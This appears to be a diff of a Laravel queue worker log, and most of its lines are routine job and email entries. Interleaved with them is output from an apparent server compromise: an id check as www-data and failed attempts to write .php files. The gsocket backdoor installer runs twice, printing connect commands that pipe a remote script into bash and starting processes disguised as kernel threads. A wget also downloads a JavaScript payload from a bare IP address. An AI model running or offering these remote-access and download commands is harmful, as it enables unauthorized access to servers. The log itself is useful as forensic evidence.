+  2026-01-28 21:04:10 App\Jobs\User\Views\RegisterResourceViews . 18.68ms DONE
+  2026-01-28 21:05:13 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 21:05:13 App\Jobs\User\Views\RegisterResourceViews . 19.93ms DONE
+  2026-01-28 21:08:10 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 21:08:10 App\Jobs\User\Views\RegisterResourceViews . 15.34ms DONE
+  2026-01-28 21:08:16 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 21:08:16 App\Jobs\User\Views\RegisterResourceViews . 22.27ms DONE
+  2026-01-28 21:10:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 21:10:31 App\Jobs\User\Views\RegisterResourceViews .. 9.10ms DONE
+  2026-01-28 21:11:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 21:11:26 App\Jobs\User\Views\RegisterResourceViews . 12.28ms DONE
+  2026-01-28 23:19:37 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 23:19:37 App\Jobs\User\Views\RegisterResourceViews . 11.00ms DONE
+  2026-01-28 23:58:44 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-28 23:58:44 App\Jobs\User\Views\RegisterResourceViews . 10.40ms DONE
+  2026-01-29 00:02:22 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 00:02:22 App\Jobs\User\Views\RegisterResourceViews . 25.26ms DONE
+  2026-01-29 00:04:51 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-29 00:04:52 App\Mail\User\Auth\RegistrationCodeMail .. 720.69ms DONE
+  2026-01-29 00:15:25 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 00:15:25 App\Jobs\User\Views\RegisterResourceViews . 26.44ms DONE
+  2026-01-29 01:06:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 01:06:36 App\Jobs\User\Views\RegisterResourceViews . 14.44ms DONE
+  2026-01-29 02:54:44 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 02:54:44 App\Jobs\User\Views\RegisterResourceViews . 28.53ms DONE
+  2026-01-29 06:10:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 06:10:17 App\Jobs\User\Views\RegisterResourceViews . 13.75ms DONE
+  2026-01-29 06:17:54 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 06:17:54 App\Jobs\User\Views\RegisterResourceViews . 26.15ms DONE
+  2026-01-29 10:19:59 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-29 10:20:00 App\Mail\User\Auth\RegistrationCodeMail .. 753.96ms DONE
+  2026-01-29 10:20:29 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-29 10:20:30 App\Mail\User\Auth\RegistrationCodeMail .. 697.42ms DONE
+  2026-01-29 16:51:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 16:51:04 App\Jobs\User\Views\RegisterResourceViews . 17.77ms DONE
+  2026-01-29 21:45:55 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-01-29 21:45:56 App\Mail\User\Auth\PasswordResetCodeMail . 699.62ms DONE
+  2026-01-29 21:57:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-29 21:57:17 App\Jobs\User\Views\RegisterResourceViews . 15.77ms DONE
+  2026-01-29 22:25:29 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-29 22:25:30 App\Mail\User\Auth\RegistrationCodeMail .. 766.03ms DONE
+  2026-01-30 06:07:39 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-30 06:07:39 Illuminate\Notifications\Notification ...... 8.42ms DONE
+  2026-01-30 08:02:31 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+  2026-01-30 08:02:31 App\Jobs\User\Views\RegisterResourceViews . 19.83ms DONE
+  2026-01-30 15:14:18 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-30 15:14:18 App\Jobs\User\Views\RegisterResourceViews . 15.08ms DONE
+  2026-01-30 15:14:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-30 15:14:24 App\Jobs\User\Views\RegisterResourceViews . 10.17ms DONE
+  2026-01-30 15:50:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-30 15:50:26 App\Jobs\User\Views\RegisterResourceViews .. 9.84ms DONE
+  2026-01-30 15:50:59 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-30 15:50:59 App\Jobs\User\Views\RegisterResourceViews . 13.98ms DONE
+  2026-01-30 15:53:17 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-30 15:53:18 App\Mail\User\Auth\RegistrationCodeMail .. 791.04ms DONE
+  2026-01-30 15:54:29 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-30 15:54:30 App\Mail\User\Auth\RegistrationCodeMail .. 704.31ms DONE
+  2026-01-30 18:07:21 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-30 18:07:22 App\Mail\User\Auth\RegistrationCodeMail .. 983.74ms DONE
+  2026-01-30 21:43:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-30 21:43:02 App\Jobs\User\Views\RegisterResourceViews . 12.93ms DONE
+  2026-01-31 00:16:28 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 00:16:28 App\Jobs\User\Views\RegisterResourceViews . 13.55ms DONE
+  2026-01-31 01:55:07 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:07 Illuminate\Notifications\Notification ..... 10.02ms DONE
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 7.11ms DONE
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 4.37ms FAIL
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 1.10ms FAIL
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 0.65ms FAIL
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 0.83ms FAIL
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 1.46ms FAIL
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification .......... RUNNING
+  2026-01-31 01:55:08 Illuminate\Notifications\Notification ...... 1.88ms FAIL
+  2026-01-31 02:51:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 02:51:49 App\Jobs\User\Views\RegisterResourceViews .. 2.26ms FAIL
+  2026-01-31 02:51:49 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 02:51:49 App\Jobs\User\Views\RegisterResourceViews . 11.31ms DONE
+  2026-01-31 02:52:07 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 02:52:07 App\Jobs\User\Views\RegisterResourceViews . 14.78ms DONE
+  2026-01-31 02:52:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 02:52:34 App\Jobs\User\Views\RegisterResourceViews . 10.45ms DONE
+  2026-01-31 03:02:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 03:02:36 App\Jobs\User\Views\RegisterResourceViews .. 3.49ms FAIL
+  2026-01-31 03:02:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 03:02:36 App\Jobs\User\Views\RegisterResourceViews . 11.04ms DONE
+  2026-01-31 04:18:17 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-31 04:18:17 App\Mail\User\Auth\RegistrationCodeMail .. 821.55ms DONE
+  2026-01-31 05:24:02 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-31 05:24:03 App\Mail\User\Auth\RegistrationCodeMail .. 801.38ms DONE
+  2026-01-31 11:58:33 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 11:58:33 App\Jobs\User\Views\RegisterResourceViews . 12.15ms DONE
+  2026-01-31 11:58:39 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 11:58:39 App\Jobs\User\Views\RegisterResourceViews . 14.78ms DONE
+  2026-01-31 12:00:45 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 12:00:45 App\Jobs\User\Views\RegisterResourceViews . 11.49ms DONE
+  2026-01-31 15:17:51 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 15:17:51 App\Jobs\User\Views\RegisterResourceViews . 13.25ms DONE
+  2026-01-31 15:23:24 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-01-31 15:23:25 App\Mail\User\Auth\RegistrationCodeMail .. 885.23ms DONE
+  2026-01-31 18:40:13 App\Notifications\User\Chat\MessageReceivedNotification  RUNNING
+  2026-01-31 18:40:13 App\Notifications\User\Chat\MessageReceivedNotification  13.71ms DONE
+  2026-01-31 18:40:13 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-31 18:40:13 Illuminate\Notifications\Events\BroadcastNotificationCreated  60.61ms DONE
+  2026-01-31 18:42:01 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 18:42:02 App\Jobs\User\Views\RegisterResourceViews . 22.56ms DONE
+  2026-01-31 18:53:17 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-31 18:53:17 App\Notifications\User\Follows\NewFollowerNotification  12.38ms DONE
+  2026-01-31 18:53:17 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-31 18:53:17 App\Notifications\User\Follows\NewFollowerNotification  11.80ms DONE
+  2026-01-31 18:53:17 App\Notifications\User\Follows\NewFollowerNotification  RUNNING
+  2026-01-31 18:53:17 Illuminate\Notifications\Events\BroadcastNotificationCreated  RUNNING
+  2026-01-31 18:53:18 Illuminate\Notifications\Events\BroadcastNotificationCreated  744.70ms DONE
+  2026-01-31 18:53:18 App\Notifications\User\Follows\NewFollowerNotification  1s DONE
+  2026-01-31 19:07:04 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 19:07:04 App\Jobs\User\Views\RegisterResourceViews . 17.33ms DONE
+  2026-01-31 19:09:22 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 19:09:22 App\Jobs\User\Views\RegisterResourceViews . 21.44ms DONE
+  2026-01-31 19:30:47 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 19:30:47 App\Jobs\User\Views\RegisterResourceViews . 17.20ms DONE
+  2026-01-31 21:38:38 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 21:38:38 App\Jobs\User\Views\RegisterResourceViews . 15.43ms DONE
+  2026-01-31 21:57:18 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-01-31 21:57:18 App\Jobs\User\Views\RegisterResourceViews . 16.93ms DONE
+  2026-02-01 01:14:59 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-02-01 01:14:59 App\Mail\User\Auth\PasswordResetCodeMail . 728.10ms DONE
+  2026-02-01 01:28:36 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 01:28:36 App\Jobs\User\Views\RegisterResourceViews .. 9.61ms DONE
+  2026-02-01 02:48:56 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 02:48:56 App\Jobs\User\Views\RegisterResourceViews . 10.70ms DONE
+  2026-02-01 08:40:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 08:40:55 App\Jobs\User\Views\RegisterResourceViews . 16.94ms DONE
+  2026-02-01 10:07:33 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 10:07:33 App\Jobs\User\Views\RegisterResourceViews . 14.75ms DONE
+  2026-02-01 10:32:37 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 10:32:37 App\Jobs\User\Views\RegisterResourceViews . 18.99ms DONE
+  2026-02-01 13:22:10 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-01 13:22:11 App\Mail\User\Auth\RegistrationCodeMail .. 906.08ms DONE
+  2026-02-01 19:17:53 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-01 19:17:54 App\Mail\User\Auth\RegistrationCodeMail ........ 1s DONE
+  2026-02-01 19:17:56 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-01 19:17:57 App\Mail\User\Auth\RegistrationCodeMail .. 699.91ms DONE
+  2026-02-01 19:18:33 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-01 19:18:33 App\Mail\User\Auth\RegistrationCodeMail .. 661.97ms DONE
+  2026-02-01 19:25:55 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 19:25:55 App\Jobs\User\Views\RegisterResourceViews . 28.51ms DONE
+  2026-02-01 22:27:17 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-01 22:27:17 App\Jobs\User\Views\RegisterResourceViews . 16.36ms DONE
+  2026-02-01 23:30:41 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-01 23:30:42 App\Mail\User\Auth\RegistrationCodeMail .. 655.05ms DONE
+  2026-02-02 02:23:43 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 02:23:43 App\Jobs\User\Views\RegisterResourceViews . 16.35ms DONE
+  2026-02-02 02:56:50 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 02:56:50 App\Jobs\User\Views\RegisterResourceViews . 12.89ms DONE
+  2026-02-02 03:24:39 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-02 03:24:40 App\Mail\User\Auth\RegistrationCodeMail .. 883.38ms DONE
+  2026-02-02 11:20:26 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 11:20:26 App\Jobs\User\Views\RegisterResourceViews . 13.52ms DONE
+  2026-02-02 15:00:49 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-02 15:00:50 App\Mail\User\Auth\RegistrationCodeMail .. 917.64ms DONE
+  2026-02-02 15:01:05 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-02 15:01:06 App\Mail\User\Auth\RegistrationCodeMail ........ 1s DONE
+  2026-02-02 16:53:58 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-02 16:53:59 App\Mail\User\Auth\RegistrationCodeMail .. 790.77ms DONE
+  2026-02-02 16:54:32 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-02 16:54:33 App\Mail\User\Auth\RegistrationCodeMail .. 680.81ms DONE
+  2026-02-02 16:57:02 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 16:57:03 App\Jobs\User\Views\RegisterResourceViews . 18.25ms DONE
+  2026-02-02 16:57:21 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 16:57:21 App\Jobs\User\Views\RegisterResourceViews . 11.04ms DONE
+  2026-02-02 19:04:05 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-02-02 19:04:06 App\Mail\User\Auth\PasswordResetCodeMail ....... 1s DONE
+  2026-02-02 19:05:24 App\Mail\User\Auth\PasswordResetCodeMail ....... RUNNING
+  2026-02-02 19:05:25 App\Mail\User\Auth\PasswordResetCodeMail . 902.73ms DONE
+  2026-02-02 19:50:46 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 19:50:46 App\Jobs\User\Views\RegisterResourceViews . 16.13ms DONE
+  2026-02-02 21:39:34 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-02 21:39:34 Illuminate\Notifications\Notification ..... 15.47ms DONE
+  2026-02-02 22:02:22 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-02 22:02:22 Illuminate\Notifications\Notification ...... 7.66ms DONE
+  2026-02-02 22:29:52 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+sh: 1: cannot create 2nv0d97d.php: Permission denied
+sh: 1: echo: echo: I/O error
+  2026-02-02 22:29:52 App\Jobs\User\Views\RegisterResourceViews . 16.10ms DONE
+  2026-02-02 23:06:13 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+sh: 1: cannot create 5nps2g4r.php: Permission denied
+  2026-02-02 23:06:13 App\Jobs\User\Views\RegisterResourceViews . 20.49ms DONE
+  2026-02-02 23:18:05 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-02 23:18:05 App\Jobs\User\Views\RegisterResourceViews . 14.66ms DONE
+  2026-02-03 00:09:34 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-03 00:09:34 App\Jobs\User\Views\RegisterResourceViews . 10.30ms DONE
+  2026-02-03 00:22:43 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:22:43 Illuminate\Notifications\Notification ...... 2.83ms DONE
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification ...... 1.64ms FAIL
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification ...... 0.75ms FAIL
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:26:04 Illuminate\Notifications\Notification ...... 1.32ms FAIL
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification ...... 1.04ms FAIL
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification ...... 1.17ms FAIL
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-03 00:28:22 Illuminate\Notifications\Notification ...... 1.17ms FAIL
+  2026-02-03 15:52:40 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-03 15:52:40 App\Jobs\User\Views\RegisterResourceViews . 25.07ms DONE
+  2026-02-03 16:06:33 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 16:06:33 App\Mail\User\Auth\RegistrationCodeMail .... 3.82ms FAIL
+  2026-02-03 16:06:33 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 16:06:34 App\Mail\User\Auth\RegistrationCodeMail .. 846.86ms DONE
+  2026-02-03 16:06:58 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 16:06:59 App\Mail\User\Auth\RegistrationCodeMail .. 664.45ms DONE
+  2026-02-03 16:09:08 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 16:09:09 App\Mail\User\Auth\RegistrationCodeMail .. 783.17ms DONE
+  2026-02-03 16:11:14 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 16:11:15 App\Mail\User\Auth\RegistrationCodeMail .. 898.25ms DONE
+  2026-02-03 18:31:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-03 18:31:24 App\Jobs\User\Views\RegisterResourceViews . 25.06ms DONE
+  2026-02-03 19:52:23 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 19:52:24 App\Mail\User\Auth\RegistrationCodeMail .. 772.02ms DONE
+  2026-02-03 19:54:06 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 19:54:06 App\Mail\User\Auth\RegistrationCodeMail .. 806.35ms DONE
+  2026-02-03 20:18:23 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+  2026-02-03 20:18:24 App\Mail\User\Auth\RegistrationCodeMail .. 721.95ms DONE
+  2026-02-04 00:58:24 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-04 00:58:24 App\Jobs\User\Views\RegisterResourceViews . 20.76ms DONE
+  2026-02-04 05:04:11 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-04 05:04:11 Illuminate\Notifications\Notification ...... 3.80ms DONE
+  2026-02-04 09:49:52 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-04 09:49:52 App\Jobs\User\Views\RegisterResourceViews . 17.42ms DONE
+  2026-02-04 11:17:06 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+  2026-02-04 11:17:06 App\Jobs\User\Views\RegisterResourceViews . 22.81ms DONE
+  2026-02-04 14:51:11 Illuminate\Notifications\Notification .......... RUNNING
+  2026-02-04 14:51:11 Illuminate\Notifications\Notification ...... 4.45ms DONE
+  2026-02-04 14:51:11 Illuminate\Notifications\Notification .......... RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network.........................................[OK]
+--> Access will be lost after reboot.
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "6V2ZifGDSthTE3svLBDH45" -i
+--> S="6V2ZifGDSthTE3svLBDH45" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="6V2ZifGDSthTE3svLBDH45" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[ksmd]'...............................[OK]
+--> WARNING: More than one [ksmd] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-04 14:51:11 Illuminate\Notifications\Notification .... 520.47ms DONE
+  2026-02-04 17:38:08 Illuminate\Notifications\Notification .......... RUNNING
+total 72
+drwxr-xr-x  19 root root  4096 Jan 29 01:32 .
+drwxr-xr-x  19 root root  4096 Jan 29 01:32 ..
+lrwxrwxrwx   1 root root     7 Jan 10  2023 bin -> usr/bin
+drwxr-xr-x   4 root root  4096 Jan 15 06:01 boot
+drwxr-xr-x  18 root root  3920 Jan 29 01:32 dev
+drwxr-xr-x 109 root root  4096 Feb  4 06:26 etc
+drwxr-xr-x   4 root root  4096 Jan 15 16:26 home
+lrwxrwxrwx   1 root root     7 Jan 10  2023 lib -> usr/lib
+lrwxrwxrwx   1 root root     9 Jan 10  2023 lib32 -> usr/lib32
+lrwxrwxrwx   1 root root     9 Jan 10  2023 lib64 -> usr/lib64
+lrwxrwxrwx   1 root root    10 Jan 10  2023 libx32 -> usr/libx32
+drwx------   2 root root 16384 Jan 10  2023 lost+found
+drwxr-xr-x   2 root root  4096 Jan 10  2023 media
+drwxr-xr-x   2 root root  4096 Jan 10  2023 mnt
+drwxr-xr-x   2 root root  4096 Jan 10  2023 opt
+dr-xr-xr-x 210 root root     0 Jan 29 01:32 proc
+drwx------  11 root root  4096 Jan 19 13:38 root
+drwxr-xr-x  32 root root  1060 Feb  4 06:26 run
+lrwxrwxrwx   1 root root     8 Jan 10  2023 sbin -> usr/sbin
+drwxr-xr-x   6 root root  4096 Jan 10  2023 snap
+drwxr-xr-x   2 root root  4096 Jan 10  2023 srv
+dr-xr-xr-x  13 root root     0 Jan 29 01:32 sys
+drwxrwxrwt  14 root root  4096 Feb  4 17:37 tmp
+drwxr-xr-x  14 root root  4096 Jan 10  2023 usr
+drwxr-xr-x  14 root root  4096 Jan 11 12:54 var
+  2026-02-04 17:38:08 Illuminate\Notifications\Notification ..... 36.27ms DONE
+  2026-02-04 18:20:17 App\Mail\User\Auth\RegistrationCodeMail ........ RUNNING
+--> WARNING: HOME not set. Using 'HOME=/var/www'
+--> Trying x86_64-alpine
+Downloading binaries........................................................[OK]
+Unpacking binaries..........................................................[OK]
+Copying binaries............................................................[OK]
+Testing binaries............................................................[OK]
+Testing Global Socket Relay Network...................................--> Access will be lost after reboot.
+......[OK]
+Installing remote access................................................[FAILED]
+--> Set GS_DSTDIR= to a writeable & executable directory.
+Executing webhooks....................................................[SKIPPING]
+--> To uninstall use GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> To connect use one of the following:
+--> gs-netcat -s "2axgVKjun4gKf3bwksKT3J" -i
+--> S="2axgVKjun4gKf3bwksKT3J" bash -c "$(curl -fsSL https://gsocket.io/y)"
+--> S="2axgVKjun4gKf3bwksKT3J" bash -c "$(wget -qO- https://gsocket.io/y)"
+Starting 'defunct' as hidden process '[card0-crtc8]'........................[OK]
+--> WARNING: More than one [card0-crtc8] is running.
+--> You may want to check: ps -elf|grep -E -- '(\[kstrp\]|\[watchdogd\]|\[ksmd\]|\[kswapd0\]|\[card0\-crtc8\]|\[mm\_percpu\_wq\]|\[rcu\_preempt\]|\[kworker\]|\[raid5wq\]|\[slub\_flushwq\]|\[netns\]|\[kaluad\])'
+--> or terminate the old ones: kill 108566 108567 108898 108899 113948 113949 114020 114021 114157 114158 114340 114341
+--> Join us on Telegram - https://t.me/thcorg
+  2026-02-04 18:20:20 App\Mail\User\Auth\RegistrationCodeMail ........ 2s DONE
+  2026-02-04 19:05:08 App\Jobs\User\Views\RegisterResourceViews ...... RUNNING
+--2026-02-04 19:05:08--  http://217.76.57.78:8009/index.js
+Connecting to 217.76.57.78:8009... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5862152 (5.6M) [application/javascript]
+Saving to: ‘/var/tmp/sysdb’
+
+     0K .......... .......... .......... .......... ..........  0% 7.83M 1s
+    50K .......... .......... .......... .......... ..........  1% 10.5M 1s
+   100K .......... .......... .......... .......... ..........  2% 39.3M 0s
+   150K .......... .......... .......... .......... ..........  3% 54.1M 0s
+   200K .......... .......... .......... .......... ..........  4% 8.13M 0s
+   250K .......... .......... .......... .......... ..........  5% 27.1M 0s
+   300K .......... .......... .......... .......... ..........  6% 11.5M 0s
+   350K .......... .......... .......... .......... ..........  6%  298M 0s
+   400K .......... .......... .......... .......... ..........  7% 82.8M 0s
+   450K .......... .......... .......... .......... ..........  8% 26.6M 0s
+   500K .......... .......... .......... .......... ..........  9% 33.2M 0s
+   550K .......... .......... .......... .......... .......... 10% 25.4M 0s
+   600K .......... .......... .......... .......... .......... 11% 29.5M 0s
+   650K .......... .......... .......... .......... .......... 12% 24.6M 0s
+   700K .......... .......... .......... .......... .......... 13% 51.7M 0s
+   750K .......... .......... .......... .......... .......... 13% 19.2M 0s
+   800K .......... .......... .......... .......... .......... 14% 56.3M 0s
+   850K .......... .......... .......... .......... .......... 15% 20.9M 0s
+   900K .......... .......... .......... .......... .......... 16% 32.1M 0s
+   950K .......... .......... .......... .......... .......... 17% 37.9M 0s
+  1000K .......... .......... .......... .......... .......... 18% 21.5M 0s
+  1050K .......... .......... .......... .......... .......... 19% 34.1M 0s
+  1100K .......... .......... .......... .......... .......... 20% 32.9M 0s
+  1150K .......... .......... .......... .......... .......... 20% 16.4M 0s
+  1200K .......... .......... .......... .......... .......... 21% 64.8M 0s
+  1250K .......... .......... .......... .......... .......... 22% 40.6M 0s
+  1300K .......... .......... .......... .......... .......... 23% 17.0M 0s
+  1350K .......... .......... .......... .......... .......... 24% 60.7M 0s
+  1400K .......... .......... .......... .......... .......... 25% 28.8M 0s
+  1450K .......... .......... .......... .......... .......... 26% 15.7M 0s
+  1500K .......... .......... .......... .......... .......... 27%  204M 0s
+  1550K .......... .......... .......... .......... .......... 27% 22.2M 0s
+  1600K .......... .......... .......... .......... .......... 28% 15.1M 0s
+  1650K .......... .......... .......... .......... .......... 29%  291M 0s
+  1700K .......... .......... .......... .......... .......... 30% 31.2M 0s
+  1750K .......... .......... .......... .......... .......... 31% 35.3M 0s
+  1800K .......... .......... .......... .......... .......... 32% 24.4M 0s
+  1850K .......... .......... .......... .......... .......... 33% 28.7M 0s
+  1900K .......... .......... .......... .......... .......... 34% 30.2M 0s
+  1950K .......... .......... .......... .......... .......... 34% 3.72M 0s
+  2000K .......... .......... .......... .......... .......... 35% 30.1M 0s
+  2050K .......... .......... .......... .......... .......... 36% 35.6M 0s
+  2100K .......... .......... .......... .......... .......... 37% 21.1M 0s
+  2150K .......... .......... .......... .......... .......... 38% 30.2M 0s
+  2200K .......... .......... .......... .......... .......... 39% 27.1M 0s
+  2250K .......... .......... .......... .......... .......... 40% 34.3M 0s
+  2300K .......... .......... .......... .......... .......... 41% 29.3M 0s
